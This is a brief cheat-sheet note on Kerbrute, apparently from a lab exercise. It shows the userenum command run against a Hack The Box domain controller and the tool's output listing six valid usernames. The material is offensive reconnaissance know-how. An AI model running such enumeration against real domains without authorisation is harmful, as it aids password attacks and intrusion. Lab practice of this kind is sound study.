# Kerbrute

Kerbrute is a tool to perform Kerberos pre-auth bruteforcing. It is a tool that can be used to enumerate valid usernames on a domain using the Kerberos protocol.

## Usage

```bash
kerbrute userenum -d <target> --dc <ip> <wordlist>
kerbrute userenum -d office.htb --dc 10.10.11.3 ~/Documents/Security/wordlists/jsmith.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/25/24 - Ronnie Flathers @ropnop

2024/03/25 21:55:44 >  Using KDC(s):
2024/03/25 21:55:44 >   10.10.11.3:88

2024/03/25 21:56:07 >  [+] VALID USERNAME:       ewhite@office.htb
2024/03/25 21:57:32 >  [+] VALID USERNAME:       dmichael@office.htb
2024/03/25 21:57:43 >  [+] VALID USERNAME:       dwolfe@office.htb
2024/03/25 21:58:11 >  [+] VALID USERNAME:       tstark@office.htb
2024/03/25 21:58:11 >  [+] VALID USERNAME:       hhogan@office.htb
2024/03/25 21:58:11 >  [+] VALID USERNAME:       ppotts@office.htb
2024/03/25 22:10:21 >  Done! Tested 48705 usernames (6 valid) in 876.820 seconds
```